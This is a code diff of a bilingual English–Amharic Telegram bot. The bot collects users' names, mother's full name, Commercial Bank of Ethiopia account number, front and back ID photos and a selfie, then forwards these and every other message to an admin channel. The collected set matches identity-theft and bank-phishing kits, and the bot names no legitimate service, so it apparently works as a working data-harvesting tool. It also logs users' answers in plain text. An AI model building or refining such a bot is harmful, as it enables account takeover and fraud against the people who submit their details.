@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Telegram Registration Bot — Button-by-Button + Auto-Forward
-Bilingual (English + አማርኛ) • 7 Button Steps • All Messages to Channel
+Telegram Registration Bot — Sequential Flow + Auto-Forward
+Bilingual (English + አማርኛ) • 7 Steps • No Buttons • All to Channel
 """
 
 import os
@@ -58,74 +58,32 @@ def health():
 FIRST, LAST, MOTHER, CBE, FRONT, BACK, PHOTO = range(7)
 
 # ══════════════════════════
-# BUTTON LABELS
-# ══════════════════════════
-BTN_START   = "🚀 Start Service | አገልግሎት ጀምር"
-BTN_FIRST   = "1️⃣ First Name | የመጀመሪያ ስም"
-BTN_LAST    = "2️⃣ Last Name | የአያት ስም"
-BTN_MOTHER  = "3️⃣ Mother's Name | የእናት ስም"
-BTN_CBE     = "4️⃣ CBE Account | ሲቢኢ አካውንት"
-BTN_FRONT   = "5️⃣ Front ID | የመታወቂያ ፊት ጎን"
-BTN_BACK    = "6️⃣ Back ID | የመታወቂያ ጀርባ ጎን"
-BTN_PHOTO   = "7️⃣ Your Photo | የእርስዎ ፎቶ"
-BTN_DONE    = "✅ Submit | አስገባ"
-BTN_CANCEL  = "❌ Cancel | ሰርዝ"
-
-# ══════════════════════════
-# KEYBOARDS
-# ══════════════════════════
-
-def menu_start():
-    return ReplyKeyboardMarkup([[KeyboardButton(BTN_START)]], resize_keyboard=True)
-
-def menu_first():
-    return ReplyKeyboardMarkup([[KeyboardButton(BTN_FIRST)]], resize_keyboard=True)
-
-def menu_last():
-    return ReplyKeyboardMarkup([[KeyboardButton(BTN_LAST)], [KeyboardButton(BTN_CANCEL)]], resize_keyboard=True)
-
-def menu_mother():
-    return ReplyKeyboardMarkup([[KeyboardButton(BTN_MOTHER)], [KeyboardButton(BTN_CANCEL)]], resize_keyboard=True)
-
-def menu_cbe():
-    return ReplyKeyboardMarkup([[KeyboardButton(BTN_CBE)], [KeyboardButton(BTN_CANCEL)]], resize_keyboard=True)
-
-def menu_front():
-    return ReplyKeyboardMarkup([[KeyboardButton(BTN_FRONT)], [KeyboardButton(BTN_CANCEL)]], resize_keyboard=True)
-
-def menu_back():
-    return ReplyKeyboardMarkup([[KeyboardButton(BTN_BACK)], [KeyboardButton(BTN_CANCEL)]], resize_keyboard=True)
-
-def menu_photo():
-    return ReplyKeyboardMarkup([[KeyboardButton(BTN_PHOTO)], [KeyboardButton(BTN_CANCEL)]], resize_keyboard=True)
-
-def menu_done():
-    return ReplyKeyboardMarkup([[KeyboardButton(BTN_DONE)], [KeyboardButton(BTN_CANCEL)]], resize_keyboard=True)
-
-def hide():
-    return ReplyKeyboardRemove()
-
-# ══════════════════════════
 # MESSAGES
 # ══════════════════════════
 
 WELCOME = (
     "🌟 *Welcome! | እንኳን ደህና መጡ!* 🌟\n\n"
-    "_Please click the button below to start._\n"
-    "_እባክዎ ከታች ያለውን ቁልፍ ይጫኑ።_"
+    "_Send /register to begin._\n"
+    "_ለመጀመር /register ይላኩ።_"
 )
 
-PROMPT_FIRST  = "📝 *Please type your first name below:*\n📝 *እባክዎ ስምዎን ከታች ይጻፉ:*"
-PROMPT_LAST   = "📝 *Please type your last name below:*\n📝 *እባክዎ የአያት ስምዎን ከታች ይጻፉ:*"
-PROMPT_MOTHER = "📝 *Please type your mother's full name below:*\n📝 *እባክዎ የእናትዎን ሙሉ ስም ከታች ይጻፉ:*"
-PROMPT_CBE    = "📝 *Please type your CBE Account number below:*\n📝 *እባክዎ የሲቢኢ አካውንት ቁጥርዎን ከታች ይጻፉ:*"
-PROMPT_FRONT  = "📷 *Please upload photo of FRONT of your ID:*\n📷 *እባክዎ የመታወቂያዎን የፊት ጎን ፎቶ ይላኩ:*"
-PROMPT_BACK   = "📷 *Please upload photo of BACK of your ID:*\n📷 *እባክዎ የመታወቂያዎን የጀርባ ጎን ፎቶ ይላኩ:*"
-PROMPT_PHOTO  = "📷 *Please upload your personal photo:*\n📷 *እባክዎ የራስዎን ፎቶ ይላኩ:*"
+PROMPTS = [
+    "1️⃣ *First Name | የመጀመሪያ ስም*\n\n_Please enter your first name:_\n_እባክዎ የመጀመሪያ ስምዎን ያስገቡ።_",
+    "2️⃣ *Last Name | የአያት ስም*\n\n_Please enter your last name:_\n_እባክዎ የአያት ስምዎን ያስገቡ።_",
+    "3️⃣ *Mother's Full Name | የእናት ሙሉ ስም*\n\n_Please enter your mother's full name:_\n_እባክዎ የእናትዎን ሙሉ ስም ያስገቡ።_",
+    "4️⃣ *CBE Account Number | የሲቢኢ አካውንት ቁጥር*\n\n_Please enter your CBE Account number:_\n_እባክዎ የሲቢኢ አካውንት ቁጥርዎን ያስገቡ።_",
+    "5️⃣ *Front ID | የመታወቂያ ፊት ጎን*\n\n📷 _Please upload photo of the FRONT side of your ID:_\n📷 _እባክዎ የመታወቂያዎን የፊት ጎን ፎቶ ይላኩ።_",
+    "6️⃣ *Back ID | የመታወቂያ ጀርባ ጎን*\n\n📷 _Please upload photo of the BACK side of your ID:_\n📷 _እባክዎ የመታወቂያዎን የጀርባ ጎን ፎቶ ይላኩ።_",
+    "7️⃣ *Your Photo | የእርስዎ ፎቶ*\n\n📷 _Please upload your personal photo:_\n📷 _እባክዎ የራስዎን ፎቶ ይላኩ።_",
+]
 
 ERR_PHOTO = "❌ *Please upload a PHOTO.*\n❌ *እባክዎ ፎቶ ይላኩ።*"
 
-CANCEL_MSG = "❌ *Cancelled | ተሰርዟል*\n\n_Press Start Service to try again._\n_እንደገና ለመሞከር አገልግሎት ጀምር ይጫኑ።_"
+CANCEL_MSG = (
+    "❌ *Registration Cancelled | ምዝገባ ተሰርዟል*\n\n"
+    "_Send /register to try again._\n"
+    "_እንደገና ለመሞከር /register ይላኩ።_"
+)
 
 def done(data):
     return (
@@ -133,17 +91,17 @@ def done(data):
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "✅ *You have finished all processes!*\n"
         "✅ *ሁሉንም ሂደቶች አጠናቀዋል!*\n\n"
-        "*Please wait while we cross-check:*\n"
-        "*እባክዎ እስክንፈትሽ ይጠብቁ:*\n\n"
+        "*Please wait while we cross-check the information you entered:*\n"
+        "*እባክዎ ያስገቡትን መረጃ እስክንፈትሽ ይጠብቁ:*\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"📋 *First Name | ስም:* {data.get('first_name','')}\n"
         f"📋 *Last Name | የአያት ስም:* {data.get('last_name','')}\n"
         f"👩 *Mother | እናት:* {data.get('mothers_name','')}\n"
-        f"🏦 *CBE | አካውንት:* {data.get('cbe_account','')}\n\n"
-        "📷 *Documents | ሰነዶች:*\n"
+        f"🏦 *CBE Account | አካውንት:* {data.get('cbe_account','')}\n\n"
+        "📷 *Documents Uploaded | የተላኩ ሰነዶች:*\n"
         "• Front ID | ፊት ጎን ✅\n"
         "• Back ID | ጀርባ ጎን ✅\n"
-        "• Photo | ፎቶ ✅\n\n"
+        "• Personal Photo | ፎቶ ✅\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "⏳ *_We will review your information shortly._*\n"
         "⏳ *_መረጃዎን በቅርቡ እንመረምራለን።_*"
@@ -163,11 +121,11 @@ def channel_msg(data, uid):
     )
 
 # ══════════════════════════
-# FORWARD TO CHANNEL
+# AUTO-FORWARD TO CHANNEL
 # ══════════════════════════
 
 async def forward_to_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Forward EVERY message from user to admin channel."""
+    """Forward EVERY user message to admin channel."""
     if not CHANNEL or not update.message:
         return
 
@@ -177,51 +135,39 @@ async def forward_to_channel(update: Update, context: ContextTypes.DEFAULT_TYPE)
     username = f"@{user.username}" if user.username else "No username"
 
     try:
-        # Forward text messages
         if update.message.text:
             await context.bot.send_message(
                 chat_id=CHANNEL,
                 text=(
-                    f"📩 *New Message | አዲስ መልእክት*\n"
-                    f"━━━━━━━━━━━━━━━━━━\n"
-                    f"👤 *From:* {name}\n"
-                    f"🔑 *ID:* `{uid}`\n"
-                    f"📎 *Username:* {username}\n"
-                    f"━━━━━━━━━━━━━━━━━━\n\n"
+                    f"📩 *Message | መልእክት*\n"
+                    f"👤 {name} | `{uid}` | {username}\n"
+                    f"━━━━━━━━━━━━━━━━\n"
                     f"{update.message.text}"
                 ),
                 parse_mode=ParseMode.MARKDOWN,
             )
 
-        # Forward photos
         elif update.message.photo:
             caption = update.message.caption or ""
             await context.bot.send_photo(
                 chat_id=CHANNEL,
                 photo=update.message.photo[-1].file_id,
                 caption=(
-                    f"📷 *Photo from:* {name}\n"
-                    f"🔑 *ID:* `{uid}`\n"
-                    f"📎 *Username:* {username}\n"
-                    f"{'📝 ' + caption if caption else ''}"
+                    f"📷 *Photo | ፎቶ*\n"
+                    f"👤 {name} | `{uid}` | {username}"
+                    f"{chr(10) + caption if caption else ''}"
                 ),
                 parse_mode=ParseMode.MARKDOWN,
             )
 
-        # Forward documents
         elif update.message.document:
             await context.bot.send_document(
                 chat_id=CHANNEL,
                 document=update.message.document.file_id,
-                caption=(
-                    f"📄 *Document from:* {name}\n"
-                    f"🔑 *ID:* `{uid}`\n"
-                    f"📎 *Username:* {username}"
-                ),
+                caption=f"📄 *Document | ሰነድ*\n👤 {name} | `{uid}`",
                 parse_mode=ParseMode.MARKDOWN,
             )
 
-        # Forward stickers
         elif update.message.sticker:
             await context.bot.send_sticker(
                 chat_id=CHANNEL,
@@ -229,19 +175,7 @@ async def forward_to_channel(update: Update, context: ContextTypes.DEFAULT_TYPE)
             )
             await context.bot.send_message(
                 chat_id=CHANNEL,
-                text=f"🎯 *Sticker from:* {name} | `{uid}`",
-                parse_mode=ParseMode.MARKDOWN,
-            )
-
-        # Forward any other message type
-        else:
-            await context.bot.send_message(
-                chat_id=CHANNEL,
-                text=(
-                    f"📩 *Other message from:* {name}\n"
-                    f"🔑 *ID:* `{uid}`\n"
-                    f"📎 *Username:* {username}"
-                ),
+                text=f"🎯 *Sticker | ስቲከር*\n👤 {name} | `{uid}`",
                 parse_mode=ParseMode.MARKDOWN,
             )
 
@@ -254,213 +188,135 @@ async def forward_to_channel(update: Update, context: ContextTypes.DEFAULT_TYPE)
 # ══════════════════════════
 
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.user_data.clear()
-    await update.message.reply_text(WELCOME, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_start())
+    """ /start """
+    await update.message.reply_text(WELCOME, parse_mode=ParseMode.MARKDOWN)
     log.info(f"/start | User={update.effective_user.id}")
 
 
-async def btn_start_service(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text != BTN_START:
-        return ConversationHandler.END
-
+async def cmd_register(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """ /register — Start the sequential flow """
     context.user_data.clear()
     context.user_data["reg"] = {}
 
     await update.message.reply_text(
-        "👇 *Click the button below to enter your First Name:*\n👇 *ስምዎን ለማስገባት ከታች ያለውን ቁልፍ ይጫኑ:*",
+        "📝 *Registration Started! | ምዝገባ ተጀምሯል!*\n\n"
+        "_Answer each question one by one._\n"
+        "_እያንዳንዱን ጥያቄ አንድ በአንድ ይመልሱ።_\n\n"
+        "_Send /cancel to stop._\n"
+        "_ለማቆም /cancel ይላኩ።_",
         parse_mode=ParseMode.MARKDOWN,
-        reply_markup=menu_first(),
     )
-    log.info(f"Start | User={update.effective_user.id}")
+    await update.message.reply_text(PROMPTS[0], parse_mode=ParseMode.MARKDOWN)
+    log.info(f"Register | User={update.effective_user.id}")
     return FIRST
 
 
-async def btn_first(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text != BTN_FIRST:
-        return FIRST
-    await update.message.reply_text(PROMPT_FIRST, parse_mode=ParseMode.MARKDOWN, reply_markup=hide())
-    return FIRST
-
-
-async def get_first(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def step_first(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 1: First Name"""
     context.user_data["reg"]["first_name"] = update.message.text.strip()
-    await update.message.reply_text(
-        f"✅ *Saved:* {update.message.text.strip()}\n\n👇 *Click below for Last Name:*",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=menu_last(),
-    )
+    log.info(f"Step 1 | User={update.effective_user.id} | {update.message.text}")
+    await update.message.reply_text(PROMPTS[1], parse_mode=ParseMode.MARKDOWN)
     return LAST
 
 
-async def btn_last(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text == BTN_LAST:
-        await update.message.reply_text(PROMPT_LAST, parse_mode=ParseMode.MARKDOWN, reply_markup=hide())
-        return LAST
-    elif update.message.text == BTN_CANCEL:
-        return await do_cancel(update, context)
-    return LAST
-
-
-async def get_last(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def step_last(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 2: Last Name"""
     context.user_data["reg"]["last_name"] = update.message.text.strip()
-    await update.message.reply_text(
-        f"✅ *Saved:* {update.message.text.strip()}\n\n👇 *Click below for Mother's Name:*",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=menu_mother(),
-    )
+    log.info(f"Step 2 | User={update.effective_user.id} | {update.message.text}")
+    await update.message.reply_text(PROMPTS[2], parse_mode=ParseMode.MARKDOWN)
     return MOTHER
 
 
-async def btn_mother(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text == BTN_MOTHER:
-        await update.message.reply_text(PROMPT_MOTHER, parse_mode=ParseMode.MARKDOWN, reply_markup=hide())
-        return MOTHER
-    elif update.message.text == BTN_CANCEL:
-        return await do_cancel(update, context)
-    return MOTHER
-
-
-async def get_mother(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def step_mother(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 3: Mother's Name"""
     context.user_data["reg"]["mothers_name"] = update.message.text.strip()
-    await update.message.reply_text(
-        f"✅ *Saved:* {update.message.text.strip()}\n\n👇 *Click below for CBE Account:*",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=menu_cbe(),
-    )
+    log.info(f"Step 3 | User={update.effective_user.id} | {update.message.text}")
+    await update.message.reply_text(PROMPTS[3], parse_mode=ParseMode.MARKDOWN)
     return CBE
 
 
-async def btn_cbe(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text == BTN_CBE:
-        await update.message.reply_text(PROMPT_CBE, parse_mode=ParseMode.MARKDOWN, reply_markup=hide())
-        return CBE
-    elif update.message.text == BTN_CANCEL:
-        return await do_cancel(update, context)
-    return CBE
-
-
-async def get_cbe(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def step_cbe(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 4: CBE Account"""
     context.user_data["reg"]["cbe_account"] = update.message.text.strip()
-    await update.message.reply_text(
-        f"✅ *Saved:* {update.message.text.strip()}\n\n👇 *Click below to upload Front ID:*",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=menu_front(),
-    )
+    log.info(f"Step 4 | User={update.effective_user.id} | {update.message.text}")
+    await update.message.reply_text(PROMPTS[4], parse_mode=ParseMode.MARKDOWN)
     return FRONT
 
 
-async def btn_front(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text == BTN_FRONT:
-        await update.message.reply_text(PROMPT_FRONT, parse_mode=ParseMode.MARKDOWN, reply_markup=hide())
-        return FRONT
-    elif update.message.text == BTN_CANCEL:
-        return await do_cancel(update, context)
-    return FRONT
-
-
-async def get_front(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def step_front(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 5: Front ID Photo"""
     if not update.message.photo:
         await update.message.reply_text(ERR_PHOTO, parse_mode=ParseMode.MARKDOWN)
         return FRONT
+
     file = await update.message.photo[-1].get_file()
     context.user_data["reg"]["front_id"] = file.file_id
-    await update.message.reply_text(
-        "✅ *Photo saved!*\n\n👇 *Click below to upload Back ID:*",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=menu_back(),
-    )
+    log.info(f"Step 5 | User={update.effective_user.id} | Photo received")
+    await update.message.reply_text(PROMPTS[5], parse_mode=ParseMode.MARKDOWN)
     return BACK
 
 
-async def btn_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text == BTN_BACK:
-        await update.message.reply_text(PROMPT_BACK, parse_mode=ParseMode.MARKDOWN, reply_markup=hide())
-        return BACK
-    elif update.message.text == BTN_CANCEL:
-        return await do_cancel(update, context)
-    return BACK
-
-
-async def get_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def step_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 6: Back ID Photo"""
     if not update.message.photo:
         await update.message.reply_text(ERR_PHOTO, parse_mode=ParseMode.MARKDOWN)
         return BACK
+
     file = await update.message.photo[-1].get_file()
     context.user_data["reg"]["back_id"] = file.file_id
-    await update.message.reply_text(
-        "✅ *Photo saved!*\n\n👇 *Click below to upload your photo:*",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=menu_photo(),
-    )
+    log.info(f"Step 6 | User={update.effective_user.id} | Photo received")
+    await update.message.reply_text(PROMPTS[6], parse_mode=ParseMode.MARKDOWN)
     return PHOTO
 
 
-async def btn_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text == BTN_PHOTO:
-        await update.message.reply_text(PROMPT_PHOTO, parse_mode=ParseMode.MARKDOWN, reply_markup=hide())
-        return PHOTO
-    elif update.message.text == BTN_CANCEL:
-        return await do_cancel(update, context)
-    return PHOTO
-
-
-async def get_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def step_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Step 7: Personal Photo → FINISH"""
     if not update.message.photo:
         await update.message.reply_text(ERR_PHOTO, parse_mode=ParseMode.MARKDOWN)
         return PHOTO
+
+    uid = update.effective_user.id
     file = await update.message.photo[-1].get_file()
     context.user_data["reg"]["personal_photo"] = file.file_id
+    data = context.user_data["reg"]
+
+    log.info(f"Step 7 | User={uid} | Complete!")
+
+    # ── Show completion ──
     await update.message.reply_text(
-        "✅ *Photo saved!*\n\n👇 *Click SUBMIT to finish:*\n👇 *ለመጨረስ አስገባ የሚለውን ይጫኑ:*",
+        done(data),
         parse_mode=ParseMode.MARKDOWN,
-        reply_markup=menu_done(),
     )
-    return PHOTO
+
+    # ── Send to channel ──
+    if CHANNEL:
+        try:
+            await context.bot.send_message(
+                chat_id=CHANNEL,
+                text=channel_msg(data, uid),
+                parse_mode=ParseMode.MARKDOWN,
+            )
+            for key, cap in [
+                ("front_id", "📷 Front ID | ፊት ጎን"),
+                ("back_id", "📷 Back ID | ጀርባ ጎን"),
+                ("personal_photo", "📷 Photo | ፎቶ"),
+            ]:
+                fid = data.get(key)
+                if fid:
+                    await context.bot.send_photo(chat_id=CHANNEL, photo=fid, caption=cap)
+
+            log.info(f"✅ Sent to channel | User={uid}")
+        except Exception as e:
+            log.error(f"Channel error: {e}")
+
+    return ConversationHandler.END
 
 
-async def submit_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text == BTN_DONE:
-        uid = update.effective_user.id
-        data = context.user_data["reg"]
-
-        await update.message.reply_text(
-            done(data),
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=menu_start(),
-        )
-
-        if CHANNEL:
-            try:
-                await context.bot.send_message(
-                    chat_id=CHANNEL,
-                    text=channel_msg(data, uid),
-                    parse_mode=ParseMode.MARKDOWN,
-                )
-                for key, cap in [
-                    ("front_id", "📷 Front ID | ፊት ጎን"),
-                    ("back_id", "📷 Back ID | ጀርባ ጎን"),
-                    ("personal_photo", "📷 Photo | ፎቶ"),
-                ]:
-                    fid = data.get(key)
-                    if fid:
-                        await context.bot.send_photo(chat_id=CHANNEL, photo=fid, caption=cap)
-
-                log.info(f"✅ Registered | User={uid} | {data.get('first_name')}")
-            except Exception as e:
-                log.error(f"Channel error: {e}")
-
-        return ConversationHandler.END
-
-    elif update.message.text == BTN_CANCEL:
-        return await do_cancel(update, context)
-
-    return PHOTO
-
-
-async def do_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """ /cancel """
     context.user_data.clear()
-    await update.message.reply_text(CANCEL_MSG, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_start())
-    log.info(f"Cancelled | User={update.effective_user.id}")
+    await update.message.reply_text(CANCEL_MSG, parse_mode=ParseMode.MARKDOWN)
+    log.info(f"Cancel | User={update.effective_user.id}")
     return ConversationHandler.END
 
 
@@ -471,48 +327,19 @@ async def do_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def build():
     app = ApplicationBuilder().token(TOKEN).build()
 
+    # Sequential registration flow
     conv = ConversationHandler(
-        entry_points=[
-            MessageHandler(filters.TEXT & ~filters.COMMAND, btn_start_service),
-        ],
+        entry_points=[CommandHandler("register", cmd_register)],
         states={
-            FIRST: [
-                MessageHandler(filters.Regex(f"^{BTN_FIRST}$"), btn_first),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_first),
-            ],
-            LAST: [
-                MessageHandler(filters.Regex(f"^{BTN_LAST}$"), btn_last),
-                MessageHandler(filters.Regex(f"^{BTN_CANCEL}$"), do_cancel),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_last),
-            ],
-            MOTHER: [
-                MessageHandler(filters.Regex(f"^{BTN_MOTHER}$"), btn_mother),
-                MessageHandler(filters.Regex(f"^{BTN_CANCEL}$"), do_cancel),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_mother),
-            ],
-            CBE: [
-                MessageHandler(filters.Regex(f"^{BTN_CBE}$"), btn_cbe),
-                MessageHandler(filters.Regex(f"^{BTN_CANCEL}$"), do_cancel),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_cbe),
-            ],
-            FRONT: [
-                MessageHandler(filters.Regex(f"^{BTN_FRONT}$"), btn_front),
-                MessageHandler(filters.Regex(f"^{BTN_CANCEL}$"), do_cancel),
-                MessageHandler(filters.PHOTO, get_front),
-            ],
-            BACK: [
-                MessageHandler(filters.Regex(f"^{BTN_BACK}$"), btn_back),
-                MessageHandler(filters.Regex(f"^{BTN_CANCEL}$"), do_cancel),
-                MessageHandler(filters.PHOTO, get_back),
-            ],
-            PHOTO: [
-                MessageHandler(filters.Regex(f"^{BTN_PHOTO}$"), btn_photo),
-                MessageHandler(filters.Regex(f"^{BTN_DONE}$"), submit_final),
-                MessageHandler(filters.Regex(f"^{BTN_CANCEL}$"), do_cancel),
-                MessageHandler(filters.PHOTO, get_photo),
-            ],
+            FIRST:  [MessageHandler(filters.TEXT & ~filters.COMMAND, step_first)],
+            LAST:   [MessageHandler(filters.TEXT & ~filters.COMMAND, step_last)],
+            MOTHER: [MessageHandler(filters.TEXT & ~filters.COMMAND, step_mother)],
+            CBE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, step_cbe)],
+            FRONT:  [MessageHandler(filters.PHOTO, step_front)],
+            BACK:   [MessageHandler(filters.PHOTO, step_back)],
+            PHOTO:  [MessageHandler(filters.PHOTO, step_photo)],
         },
-        fallbacks=[CommandHandler("cancel", do_cancel)],
+        fallbacks=[CommandHandler("cancel", cmd_cancel)],
         allow_reentry=True,
         per_message=False,
     )
@@ -520,10 +347,10 @@ def build():
     app.add_handler(conv)
     app.add_handler(CommandHandler("start", cmd_start))
 
-    # ⭐ AUTO-FORWARD: Catch ALL messages and forward to channel
+    # ⭐ Auto-forward ALL messages to channel
     app.add_handler(
         MessageHandler(filters.ALL, forward_to_channel),
-        group=999,  # Lowest priority — runs AFTER all other handlers
+        group=999,
     )
 
     return app
@@ -542,5 +369,5 @@ if __name__ == "__main__":
     log.info(f"Health server on port {PORT}")
 
     bot = build()
-    log.info("✅ Bot running with auto-forward!")
+    log.info("✅ Bot running — Sequential flow + Auto-forward!")
     bot.run_polling(allowed_updates=Update.ALL_TYPES)
